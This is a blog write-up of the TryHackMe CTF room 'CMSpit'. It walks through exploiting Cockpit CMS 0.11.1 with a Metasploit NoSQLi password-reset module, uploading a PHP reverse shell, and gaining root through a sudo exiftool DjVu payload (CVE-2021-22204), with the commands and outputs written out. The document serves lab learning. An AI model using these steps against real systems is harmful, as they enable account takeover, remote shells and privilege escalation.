<!DOCTYPE html>
<html>
<head>

    <!-- Document Settings -->
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />

    <!-- Base Meta -->
    <!-- dynamically fixing the title for tag/author pages -->



    <title>CMSpit Write Up</title>
    <meta name="HandheldFriendly" content="True" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <!-- Styles'n'Scripts -->
    <link rel="stylesheet" type="text/css" href="/assets/built/screen.css" />
    <link rel="stylesheet" type="text/css" href="/assets/built/screen.edited.css" />
    <link rel="stylesheet" type="text/css" href="/assets/built/syntax.css" />
    <!-- highlight.js -->
    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/default.min.css">
    <style>.hljs { background: none; }</style>

    <!--[if IE]>
        <style>
            p, ol, ul{
                width: 100%;
            }
            blockquote{
                width: 100%;
            }
        </style>
    <![endif]-->
    
    <!-- This tag outputs SEO meta+structured data and other important settings -->
    <meta name="description" content="Infosec | Hacking | CTF" />
    <link rel="shortcut icon" href="https://darrynbrownfield.co.uk/assets/images/favicon.png" type="image/png" />
    <link rel="canonical" href="https://darrynbrownfield.co.uk/cmspit" />
    <meta name="referrer" content="no-referrer-when-downgrade" />

     <!--title below is coming from _includes/dynamic_title-->
    <meta property="og:site_name" content="Darryn Brownfield" />
    <meta property="og:type" content="website" />
    <meta property="og:title" content="CMSpit Write Up" />
    <meta property="og:description" content="Overview cmspit is a medium rated CTF room on TryHackMe. This was a good machine highlighting recent CVE’s, thanks stuxnet. Nmap Although not required I added a entry in my hosts file with the machine IP to cmspit.thm. Once added I started a nmap scan to check for available ports." />
    <meta property="og:url" content="https://darrynbrownfield.co.uk/cmspit" />
    <meta property="og:image" content="https://darrynbrownfield.co.uk/assets/images/cmspit/cover.png" />
    <meta property="article:publisher" content="https://www.facebook.com/" />
    <meta property="article:author" content="https://www.facebook.com/" />
    <meta property="article:published_time" content="2021-08-08T00:00:00+00:00" />
    <meta property="article:modified_time" content="2021-08-08T00:00:00+00:00" />
    <meta property="article:tag" content="Tryhackme" />
    <meta name="twitter:card" content="summary_large_image" />
    <meta name="twitter:title" content="CMSpit Write Up" />
    <meta name="twitter:description" content="Overview cmspit is a medium rated CTF room on TryHackMe. This was a good machine highlighting recent CVE’s, thanks stuxnet. Nmap Although not required I added a entry in my hosts file with the machine IP to cmspit.thm. Once added I started a nmap scan to check for available ports." />
    <meta name="twitter:url" content="https://darrynbrownfield.co.uk/" />
    <meta name="twitter:image" content="https://darrynbrownfield.co.uk/assets/images/cmspit/cover.png" />
    <meta name="twitter:label1" content="Written by" />
    <meta name="twitter:data1" content="Darryn Brownfield" />
    <meta name="twitter:label2" content="Filed under" />
    <meta name="twitter:data2" content="Tryhackme" />
    <meta name="twitter:site" content="@dazbrownfield" />
    <meta name="twitter:creator" content="@dazbrownfield" />
    <meta property="og:image:width" content="1400" />
    <meta property="og:image:height" content="933" />

    <script type="application/ld+json">
{
    "@context": "https://schema.org",
    "@type": "Website",
    "publisher": {
        "@type": "Organization",
        "name": "Darryn Brownfield",
        "logo": "https://darrynbrownfield.co.uk/assets/images/blog-icon.png"
    },
    "url": "https://darrynbrownfield.co.uk/cmspit",
    "image": {
        "@type": "ImageObject",
        "url": "https://darrynbrownfield.co.uk/assets/images/cmspit/cover.png",
        "width": 2000,
        "height": 666
    },
    "mainEntityOfPage": {
        "@type": "WebPage",
        "@id": "https://darrynbrownfield.co.uk/cmspit"
    },
    "description": "Overview cmspit is a medium rated CTF room on TryHackMe. This was a good machine highlighting recent CVE’s, thanks stuxnet. Nmap Although not required I added a entry in my hosts file with the machine IP to cmspit.thm. Once added I started a nmap scan to check for available ports."
}
    </script>

    <!-- <script type="text/javascript" src="https://demo.ghost.io/public/ghost-sdk.min.js?v=724281a32e"></script>
    <script type="text/javascript">
    ghost.init({
    	clientId: "ghost-frontend",
    	clientSecret: "f84a07a72b17"
    });
    </script> -->

    <meta name="generator" content="Jekyll 3.6.2" />
    <link rel="alternate" type="application/rss+xml" title="CMSpit Write Up" href="/feed.xml" />


</head>
<body class="post-template">

    <div class="site-wrapper">
        <!-- All the main content gets inserted here, index.hbs, post.hbs, etc -->
        <!-- default -->

<!-- The tag above means: insert everything in this file
into the {body} of the default.hbs template -->

<header class="site-header outer">
    <div class="inner">
        <nav class="site-nav">
    <div class="site-nav-left">
        
            

            
        
        
            <ul class="nav" role="menu">
    <li class="nav-home" role="menuitem"><a href="/">Home</a></li>
    <li class="nav-about" role="menuitem"><a href="/about/">About</a></li>
    <li class="nav-getting-started" role="menuitem"><a href="/tag/ctf/">CTF</a></li>
</ul>

        
    </div>
    <div class="site-nav-right">
        <div class="social-links">
            
            <a
              class="social-link social-link-tw"
              href="https://github.com/darrynb89"
              target="_blank"
              rel="noopener"
              ><svg
  version="1.0"
  xmlns="http://www.w3.org/2000/svg"
  viewBox="0 0 120.000000 120.000000"
>
  <g
    transform="translate(0.000000,120.000000) scale(0.0900000,-0.0900000)"
    fill="#ffffff"
    stroke="none"
  >
    <path
      d="M441 1174 c-105 -28 -181 -73 -266 -159 -125 -124 -175 -246 -175
-425 0 -179 50 -300 175 -425 85 -85 185 -145 243 -145 36 0 42 13 42 89 l0
57 -57 -3 c-74 -5 -117 17 -150 78 -13 24 -37 56 -54 71 -34 33 -36 38 -9 38
12 0 20 -7 20 -16 0 -10 6 -14 14 -11 10 4 13 1 9 -9 -3 -10 2 -14 18 -14 18
0 20 -3 10 -9 -16 -11 -4 -34 14 -27 9 3 11 -2 7 -16 -4 -18 -2 -20 21 -14 20
5 25 3 21 -8 -9 -23 17 -31 33 -11 12 17 13 17 13 2 0 -11 8 -17 21 -17 15 0
19 5 15 15 -3 8 -1 15 4 15 6 0 10 -7 10 -15 0 -8 7 -15 15 -15 8 0 15 8 15
18 0 10 10 39 23 64 l23 46 -59 13 c-136 28 -210 123 -211 268 -1 66 3 82 27
124 23 39 27 55 22 86 -7 40 9 121 24 121 18 0 78 -25 113 -46 30 -19 42 -22
70 -14 18 6 71 10 118 10 47 0 100 -4 118 -10 28 -8 40 -5 70 14 35 21 95 46
113 46 15 0 31 -81 24 -121 -5 -31 -1 -47 22 -86 24 -42 28 -58 27 -123 -1
-147 -65 -231 -203 -266 l-68 -18 18 -30 c15 -25 19 -51 19 -138 0 -58 3 -113
6 -122 20 -52 166 16 279 129 125 125 175 246 175 425 0 179 -50 301 -175 425
-86 87 -161 131 -270 160 -75 19 -241 19 -314 -1z"
    />
  </g>
</svg></a
            >
            
            <a
              class="social-link social-link-li"
              href="https://www.linkedin.com/in/darryn-brownfield-0b1132b5"
              target="_blank"
              rel="noopener"
              ><svg viewBox="0 50 512 512">
    <g transform="translate(0.000000,20.000000) scale(1.1)">
      <path
        d="M150.65,100.682c0,27.992-22.508,50.683-50.273,50.683c-27.765,0-50.273-22.691-50.273-50.683
      C50.104,72.691,72.612,50,100.377,50C128.143,50,150.65,72.691,150.65,100.682z M143.294,187.333H58.277V462h85.017V187.333z
      M279.195,187.333h-81.541V462h81.541c0,0,0-101.877,0-144.181c0-38.624,17.779-61.615,51.807-61.615
      c31.268,0,46.289,22.071,46.289,61.615c0,39.545,0,144.181,0,144.181h84.605c0,0,0-100.344,0-173.915
      s-41.689-109.131-99.934-109.131s-82.768,45.369-82.768,45.369V187.333z"
      />
    </g>
  </svg></a
            >
             
            <a
              class="social-link social-link-tw"
              href="https://twitter.com/dazbrownfield"
              target="_blank"
              rel="noopener"
              ><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path d="M30.063 7.313c-.813 1.125-1.75 2.125-2.875 2.938v.75c0 1.563-.188 3.125-.688 4.625a15.088 15.088 0 0 1-2.063 4.438c-.875 1.438-2 2.688-3.25 3.813a15.015 15.015 0 0 1-4.625 2.563c-1.813.688-3.75 1-5.75 1-3.25 0-6.188-.875-8.875-2.625.438.063.875.125 1.375.125 2.688 0 5.063-.875 7.188-2.5-1.25 0-2.375-.375-3.375-1.125s-1.688-1.688-2.063-2.875c.438.063.813.125 1.125.125.5 0 1-.063 1.5-.25-1.313-.25-2.438-.938-3.313-1.938a5.673 5.673 0 0 1-1.313-3.688v-.063c.813.438 1.688.688 2.625.688a5.228 5.228 0 0 1-1.875-2c-.5-.875-.688-1.813-.688-2.75 0-1.063.25-2.063.75-2.938 1.438 1.75 3.188 3.188 5.25 4.25s4.313 1.688 6.688 1.813a5.579 5.579 0 0 1 1.5-5.438c1.125-1.125 2.5-1.688 4.125-1.688s3.063.625 4.188 1.813a11.48 11.48 0 0 0 3.688-1.375c-.438 1.375-1.313 2.438-2.563 3.188 1.125-.125 2.188-.438 3.313-.875z"/></svg>
</a
            >
             
          </div>
</nav>

    </div>
</header>

<!-- Everything inside the #post tags pulls data from the post -->
<!-- #post -->

<main id="site-main" class="site-main outer" role="main">
    <div class="inner">

        <article class="post-full  tag-tryhackme tag-ctf tag-medium post ">

            <header class="post-full-header">
                <section class="post-full-meta">
                    <time class="post-full-meta-date" datetime=" 8 August 2021"> 8 August 2021</time>
                    
                        <span class="date-divider">/</span>
                        
                            
                               <a href='/tag/tryhackme/'>TRYHACKME</a>,
                            
                        
                            
                               <a href='/tag/ctf/'>CTF</a>,
                            
                        
                            
                               <a href='/tag/medium/'>MEDIUM</a>
                            
                        
                    
                </section>
                <h1 class="post-full-title">CMSpit Write Up</h1>
            </header>

            <section class="post-full-content">
                <div class="kg-card-markdown">
                    <p><img src="/assets/images/cmspit/cover.png" alt="cover" /></p>

<h3 id="overview">Overview</h3>

<p><a href="https://tryhackme.com/room/cmspit">cmspit</a> is a medium rated CTF room on <a href="https://tryhackme.com">TryHackMe</a>. This was a good machine highlighting recent CVE’s, thanks <a href="https://twitter.com/_stuxnet">stuxnet</a>.</p>

<h3 id="nmap">Nmap</h3>

<p>Although not required I added a entry in my hosts file with the machine IP to cmspit.thm. Once added I started a nmap scan to check for available ports.</p>

<pre><code class="language-highlight">└──╼ $sudo nmap -sC -sV -oA nmap/initial cmspit.thm
Starting Nmap 7.80 ( https://nmap.org ) at 2021-08-08 11:11 BST
Nmap scan report for cmspit.thm (10.10.34.218)
Host is up (0.035s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 7f:25:f9:40:23:25:cd:29:8b:28:a9:d9:82:f5:49:e4 (RSA)
|   256 0a:f4:29:ed:55:43:19:e7:73:a7:09:79:30:a8:49:1b (ECDSA)
|_  256 2f:43:ad:a3:d1:5b:64:86:33:07:5d:94:f9:dc:a4:01 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-title: Authenticate Please!
|_Requested resource was /auth/login?to=/
|_http-trane-info: Problem with XML parsing of /evox/about
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.50 seconds
</code></pre>

<p>2 Ports open:</p>

<ul>
  <li>22 - SSH - OpenSSH 7.2p2</li>
  <li>80 - HTTP - Apache 2.4.18</li>
</ul>

<p>I ran a full port scan but no additional ports were found.</p>

<h3 id="enumeration">Enumeration</h3>

<p>Clearly this is going to be a web challenge, while I poked around the website I wanted some enumeration going on in the background so started Gobuster and Nikto.</p>

<pre><code class="language-highlight">└──╼ $gobuster dir -u cmspit.thm -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://cmspit.thm
[+] Threads:        10
[+] Wordlist:       /opt/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/08/08 11:16:09 Starting gobuster
===============================================================
Error: the server returns a status code that matches the provided options for non existing urls. http://cmspit.thm/fbaebb24-03e7-4123-b75f-01915dfcbf6b =&gt; 302. To force processi
ng of Wildcard responses, specify the '--wildcard' switch
</code></pre>

<p>However is looks like all requests are being sent to ‘http://cmspit.thm/auth/login?to=/’</p>

<p>However, I did have some more luck with Nikto.</p>

<pre><code class="language-highlight">└──╼ $nikto -h cmspit.thm
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.34.218
+ Target Hostname:    cmspit.thm
+ Target Port:        80
+ Start Time:         2021-08-08 11:18:16 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ Cookie 8071dec2be26139e39a170762581c00f created without the httponly flag
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Root page / redirects to: /auth/login?to=/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ OSVDB-3233: /icons/README: Apache default file found.
+ Retrieved access-control-allow-origin header: *
+ /server-status: Apache server-status interface found (protected/forbidden)
+ /composer.json: PHP Composer configuration file reveals configuration information - https://getcomposer.org/
+ /package.json: Node.js package file found. It may contain sensitive information.
+ 7789 requests: 3 error(s) and 10 item(s) reported on remote host
+ End Time:           2021-08-08 11:25:02 (GMT1) (406 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
</code></pre>

<p>I went to http://cmspit.thm/ which redirected me to http://cmspit.thm/auth/login?to=/. I tried some basic username and password combinations but nothing worked.</p>

<p><img src="/assets/images/cmspit/homepage.png" alt="homepage" /></p>

<p>From the logo and name on the authentication page, its clear we are working with Cockpit CMS. I checked the source code and found the version 0.11.1. This was also confirmed by going to http://cmspit.thm/package.json found via Nikto.</p>

<p><img src="/assets/images/cmspit/version.png" alt="version" /></p>

<p>I googled ‘cockpit cms 0.11.1 exploit’ and found a great <a href="https://swarm.ptsecurity.com/rce-cockpit-cms/">blog</a> by <a href="https://twitter.com/ultrayoba">Nikita Petrov</a>, however im lazy and also found a metasploit module.</p>

<pre><code class="language-highlight">msf6 &gt; search cockpit

Matching Modules
================

   #  Name                                Disclosure Date  Rank    Check  Description
   -  ----                                ---------------  ----    -----  -----------
   0  exploit/multi/http/cockpit_cms_rce  2021-04-13       normal  Yes    Cockpit CMS NoSQLi to RCE


Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/http/cockpit_cms_rce

msf6 &gt; 
</code></pre>

<p>I selected the module using the command ‘use 0’ and filled out the options.</p>

<pre><code class="language-highlight">msf6 exploit(multi/http/cockpit_cms_rce) &gt; show options

Module options (exploit/multi/http/cockpit_cms_rce):

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   ENUM_USERS  true             no        Enumerate users
   Proxies                      no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS      cmspit.thm       yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&lt;path&gt;'
   RPORT       80               yes       The target port (TCP)
   SSL         false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI   /                yes       The URI of Cockpit
   USER                         no        User account to take over
   VHOST                        no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  tun0             yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target


msf6 exploit(multi/http/cockpit_cms_rce) &gt; 
</code></pre>

<p>I ran the module and was able to find 4 users, however the module then failed as a user was required.</p>

<pre><code class="language-highlight">msf6 exploit(multi/http/cockpit_cms_rce) &gt; run

[*] Started reverse TCP handler on &lt;Local Machine&gt;:4444 
[*] Attempting Username Enumeration (CVE-2020-35846)
[+]   Found users: ["admin", "darkStar7471", "skidy", "ekoparty"]
[-] Exploit aborted due to failure: bad-config: cmspit.thm:80 - User to exploit required
[*] Exploit completed, but no session was created.
msf6 exploit(multi/http/cockpit_cms_rce) &gt; 
</code></pre>

<p>I set user to admin and ran the module again.</p>

<pre><code class="language-highlight">msf6 exploit(multi/http/cockpit_cms_rce) &gt; set user admin
user =&gt; admin
msf6 exploit(multi/http/cockpit_cms_rce) &gt; run

[*] Started reverse TCP handler on &lt;Local Machine&gt;:4444 
[*] Attempting Username Enumeration (CVE-2020-35846)
[+]   Found users: ["admin", "darkStar7471", "skidy", "ekoparty"]
[*] Obtaining reset tokens (CVE-2020-35847)
[+]   Found tokens: ["rp-d72d501f6207ac757ac3cb114d1a0a4760a88abe28f23"]
[*] Checking token: rp-d72d501f6207ac757ac3cb114d1a0a4760a88abe28f23
[*] Obtaining user info
[*]   user: admin
[*]   name: Admin
[*]   email: admin@yourdomain.de
[*]   active: true
[*]   group: admin
[*]   password: &lt;REDACTED&gt;
[*]   i18n: en
[*]   _created: 1621655201
[*]   _modified: 1621655201
[*]   _id: 60a87ea165343539ee000300
[*]   _reset_token: rp-d72d501f6207ac757ac3cb114d1a0a4760a88abe28f23
[*]   md5email: a11eea8bf873a483db461bb169beccec
[+] Changing password to &lt;REDACTED&gt;
[+] Password update successful
[*] Attempting login
[-] Exploit failed: ArgumentError wrong number of arguments (given 3, expected 1..2)
[*] Exploit completed, but no session was created.
msf6 exploit(multi/http/cockpit_cms_rce) &gt; 
</code></pre>

<p>The exploit failed again however it was able to change the admin password. I went back to the login page and was able to log in as admin.</p>

<p><img src="/assets/images/cmspit/loggedin.png" alt="loggedin" /></p>

<h3 id="initial-access">Initial Access</h3>

<p>In the blog post, RCE was possible by uploading a PHP script via the finder directory so I went to cmspit.thm/finder</p>

<p>I copied a PHP reverse shell script to my directory.</p>

<pre><code class="language-highlight">└──╼ $cp /usr/share/webshells/php/php-reverse-shell.php .
┌─[daz@parrot]─[~/Documents/TryHackMe/CMSpit]
└──╼ $mv php-reverse-shell.php shell.php
┌─[daz@parrot]─[~/Documents/TryHackMe/CMSpit]
</code></pre>

<p>I updated the script with my tun0 IP and port of 4444 and started a nc listener with the command <code class="highlighter-rouge">nc -nvlp 4444</code>. On the webpage I clicked the upload button and selected my shell.php file.</p>

<p>Now going to ‘http://cmspit.thm/shell.php’ I get a shell!</p>

<h3 id="priv-esc">Priv Esc</h3>

<p>Now I have a shell as www-data I want to escalate my privileges. I enumerated the machine and noticed Mongodb was listening on TCP port 27017.</p>

<pre><code class="language-highlight">Proto Recv-Q Send-Q Local Address           Foreign Address         State       Timer                  
tcp        0      0 127.0.0.1:27017         0.0.0.0:*               LISTEN      off (0.00/0/0)         
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      off (0.00/0/0)              
tcp6       0      0 :::80                   :::*                    LISTEN      off (0.00/0/0)         
tcp6       0      0 :::22                   :::*                    LISTEN      off (0.00/0/0)               
</code></pre>

<p>I connected to the mongodb service and was able to find the credentials for the user ‘stux’.</p>

<pre><code class="language-highlight">$ mongo 127.0.0.1:27017
MongoDB shell version: 2.6.10
connecting to: 127.0.0.1:27017/test
show dbs
admin         (empty)
local         0.078GB
sudousersbak  0.078GB
use sudousersbak
show collections
switched to db sudousersbak
flag
system.indexes
user
db.user.find()
{ "_id" : ObjectId("60a89d0caadffb0ea68915f9"), "name" : "&lt;REDACTED&gt;" }
{ "_id" : ObjectId("60a89dfbaadffb0ea68915fa"), "name" : "stux" }
</code></pre>

<p>I used the credentials to SSH to the machine and ran the command ‘sudo -l’.</p>

<pre><code class="language-highlight">└──╼ $ssh stux@cmspit.thm
stux@cmspit.thm's password: 
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-210-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Last login: Sat May 22 19:41:38 2021 from 192.168.85.1
stux@ubuntu:~$ sudo -l
Matching Defaults entries for stux on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User stux may run the following commands on ubuntu:
    (root) NOPASSWD: /usr/local/bin/exiftool
stux@ubuntu:~$ 
</code></pre>

<p>The user stux can run the command /usr/local/bin/exiftool as root with out the root password. Normally, I would now go to GTFObins to look for a priv esc, however the room questions indicate a CVE vulnerability so I googled ‘exiftools CVE’ and found this <a href="https://blog.convisoappsec.com/en/a-case-study-on-cve-2021-22204-exiftool-rce/">blog</a>.</p>

<p>In the blog it details the steps of how to exploit the vulnerability which is:</p>

<blockquote>
  <p>$ sudo apt install djvulibre-bin</p>

  <p>$ bzz payload payload.bzz</p>

  <p>$ djvumake exploit.djvu INFO=’1,1’ BGjp=/dev/null ANTz=payload.bzz</p>
</blockquote>

<p>Back on my local machine, I created a payload file with the following contents <code class="highlighter-rouge">(metadata "\c${system('/bin/bash')};")</code>, then followed the steps above.</p>

<pre><code class="language-highlight">┌─[daz@parrot]─[~/Documents/TryHackMe/CMSpit]
└──╼ $cat payload
(metadata "\c${system('/bin/bash')};")
┌─[daz@parrot]─[~/Documents/TryHackMe/CMSpit]
└──╼ $sudo apt install djvulibre-bin
Reading package lists... Done
Building dependency tree       
Reading state information... Done
djvulibre-bin is already the newest version (3.5.28-2).
The following packages were automatically installed and are no longer required:
  gdal-data libaec0 libarmadillo9 libarpack2 libboost-locale1.67.0 libcfitsio8 libcharls2 libdap25 libdapclient6v5 libepsilon1 libfreexl1 libfyba0 libgdal26 libgeos-3.8.1
  libgeos-c1v5 libgeotiff5 libgfapi0 libgfrpc0 libgfxdr0 libglusterfs0 libhdf4-0-alt libhdf5-103 libkmlbase1 libkmldom1 libkmlengine1 libnetcdf15 libogdi4.1 liborcus-0.15-0
  liborcus-parser-0.15-0 libproj19 libpython3.7-minimal libpython3.7-stdlib libpython3.8-dev libqhull7 libspatialite7 libsuperlu5 libsz2 liburiparser1 libxerces-c3.2 odbcinst
  odbcinst1debian2 proj-bin proj-data python3-gridfs python3.7 python3.7-minimal python3.8-dev
Use 'sudo apt autoremove' to remove them.
0 upgraded, 0 newly installed, 0 to remove and 2541 not upgraded.
┌─[daz@parrot]─[~/Documents/TryHackMe/CMSpit]
└──╼ $bzz payload payload.bzz
┌─[daz@parrot]─[~/Documents/TryHackMe/CMSpit]
└──╼ $djvumake exploit.djvu INFO='1,1' BGjp=/dev/null ANTz=payload.bzz
┌─[daz@parrot]─[~/Documents/TryHackMe/CMSpit]
└──╼ $ls -la exploit.djvu 
-rw-r--r-- 1 daz daz 92 Aug  8 12:13 exploit.djvu
┌─[daz@parrot]─[~/Documents/TryHackMe/CMSpit]
└──╼ $
</code></pre>

<p>Finaly I started a Python webserver with the command <code class="highlighter-rouge">sudo python3 -m http.server 80</code>. Next back on cmspit machine I downloaded the exploit.djvu file with wget and ran the exif tool as sudo against the exploit file and got root!</p>

<pre><code class="language-highlight">stux@ubuntu:~$ wget http://&lt;Local Machine&gt;/exploit.djvu
--2021-08-08 04:16:42--  http://&lt;Local Machine&gt;/exploit.djvu
Connecting to &lt;Local Machine&gt;:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 92 [image/vnd.djvu]
Saving to: ‘exploit.djvu’

exploit.djvu                                 100%[===========================================================================================&gt;]      92  --.-KB/s    in 0s

2021-08-08 04:16:42 (17.8 MB/s) - ‘exploit.djvu’ saved [92/92]

stux@ubuntu:~$ sudo /usr/local/bin/exiftool exploit.djvu 
root@ubuntu:~# whoami
root
root@ubuntu:~# hostname
</code></pre>

<p>Thanks for reading!</p>

<p>============================================================</p>

<p>Any comments or feedback welcome! You can find me on <a href="https://twitter.com/dazbrownfield">twitter</a>.</p>

<p><a href="https://www.buymeacoffee.com/dazbrownfield" target="_blank"><img src="https://cdn.buymeacoffee.com/buttons/v2/default-blue.png" alt="Buy Me A Coffee" style="height: 60px !important;width: 217px !important;" /></a></p>


                </div>
            </section>

            <!-- Email subscribe form at the bottom of the page -->
            

            <footer class="post-full-footer">
                <!-- Everything inside the #author tags pulls data from the author -->
            </footer>

            <!-- If you use Disqus comments, just uncomment this block.
            The only thing you need to change is "test-apkdzgmqhj" - which
            should be replaced with your own Disqus site-id. -->
            

        </article>

    </div>
</main>



        <!-- Previous/next page links - displayed on every page -->
        

        <!-- The footer at the very bottom of the screen -->
        <footer class="site-footer outer">
            <div class="site-footer-content inner">
                <section class="copyright"><a href="https://darrynbrownfield.co.uk/">Darryn Brownfield</a> &copy; 2021</section>
                <nav class="site-footer-nav">
                    <a href="/">Latest Posts</a>
                 </nav>
            </div>
        </footer>

    </div>

    <!-- The big email subscribe modal content -->
    

    <!-- highlight.js -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.10.0/components/prism-abap.min.js"></script>
    <script>$(document).ready(function() {
      $('pre code').each(function(i, block) {
        hljs.highlightBlock(block);
      });
    });</script>

    <!-- jQuery + Fitvids, which makes all video embeds responsive -->
    <script
        src="https://code.jquery.com/jquery-3.2.1.min.js"
        integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4="
        crossorigin="anonymous">
    </script>
    <script type="text/javascript" src="/assets/js/jquery.fitvids.js"></script>
    <script type="text/javascript" src="https://demo.ghost.io/assets/js/jquery.fitvids.js?v=724281a32e"></script>


    <!-- Paginator increased to "infinit" in _config.yml -->
    <!-- if paginator.posts  -->
    <!-- <script>
        var maxPages = parseInt('');
    </script>
    <script src="/assets/js/infinitescroll.js"></script> -->
    <!-- /endif -->

    


    <!-- Add Google Analytics  -->
    <!-- Google Analytics Tracking code -->
 <script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-175458891-1', 'auto');
  ga('send', 'pageview');

 </script>


    <!-- The #block helper will pull in data from the #contentFor other template files. In this case, there's some JavaScript which we only want to use in post.hbs, but it needs to be included down here, after jQuery has already loaded. -->
    
        <script>

// NOTE: Scroll performance is poor in Safari
// - this appears to be due to the events firing much more slowly in Safari.
//   Dropping the scroll event and using only a raf loop results in smoother
//   scrolling but continuous processing even when not scrolling
$(document).ready(function () {
    // Start fitVids
    var $postContent = $(".post-full-content");
    $postContent.fitVids();
    // End fitVids

    var progressBar = document.querySelector('progress');
    var header = document.querySelector('.floating-header');
    var title = document.querySelector('.post-full-title');

    var lastScrollY = window.scrollY;
    var lastWindowHeight = window.innerHeight;
    var lastDocumentHeight = $(document).height();
    var ticking = false;

    function onScroll() {
        lastScrollY = window.scrollY;
        requestTick();
    }

    function onResize() {
        lastWindowHeight = window.innerHeight;
        lastDocumentHeight = $(document).height();
        requestTick();
    }

    function requestTick() {
        if (!ticking) {
            requestAnimationFrame(update);
        }
        ticking = true;
    }

    function update() {
        var trigger = title.getBoundingClientRect().top + window.scrollY;
        var triggerOffset = title.offsetHeight + 35;
        var progressMax = lastDocumentHeight - lastWindowHeight;

        // show/hide floating header
        if (lastScrollY >= trigger + triggerOffset) {
            header.classList.add('floating-active');
        } else {
            header.classList.remove('floating-active');
        }

        progressBar.setAttribute('max', progressMax);
        progressBar.setAttribute('value', lastScrollY);

        ticking = false;
    }

    window.addEventListener('scroll', onScroll, {passive: true});
    window.addEventListener('resize', onResize, false);

    update();
});
</script>

    

    <!-- Ghost outputs important scripts and data with this tag - it should always be the very last thing before the closing body tag -->
    <!-- ghost_foot -->

</body>
</html>
